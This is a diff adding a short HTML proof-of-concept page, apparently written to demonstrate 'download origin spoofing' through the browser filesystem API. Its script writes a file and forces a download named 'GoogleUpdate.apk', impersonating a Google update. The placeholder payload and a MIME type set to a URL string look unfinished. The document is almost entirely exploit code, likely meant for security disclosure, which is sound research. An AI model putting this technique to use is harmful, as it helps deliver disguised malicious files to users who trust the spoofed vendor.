@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Filesystem Download Origin POC</title>
+</head>
+<body>
+  <h2>Filesystem Download Origin Spoofing – POC</h2>
+  <button id="go">Trigger download</button>
+
+  <script>
+    document.getElementById("go").onclick = async () => {
+      // Step 1: request a temporary filesystem
+      window.requestFileSystem =
+        window.requestFileSystem || window.webkitRequestFileSystem;
+
+      requestFileSystem(
+        TEMPORARY,
+        1024 * 1024,
+        fs => {
+          // Step 2: create attacker-controlled file
+          fs.root.getFile(
+            "google_update.apk",
+            { create: true },
+            fileEntry => {
+              fileEntry.createWriter(writer => {
+                // Arbitrary payload (pretend APK)
+                const blob = new Blob(
+                  ["https://google.com/html"],
+                  { type: "https://google.com/html" }
+                );
+
+                writer.onwriteend = () => {
+                  // Step 3: force download
+                  const a = document.createElement("a");
+                  a.href = fileEntry.toURL(); // filesystem: URL
+                  a.download = "GoogleUpdate.apk";
+                  document.body.appendChild(a);
+                  a.click();
+                  document.body.removeChild(a);
+
+                  console.log("ghjv", fileEntry.toURL());
+                };
+
+                writer.write(blob);
+              });
+            }
+          );
+        },
+        err => console.error("FS error", err)
+      );
+    };
+  </script>
+</body>
+</html>
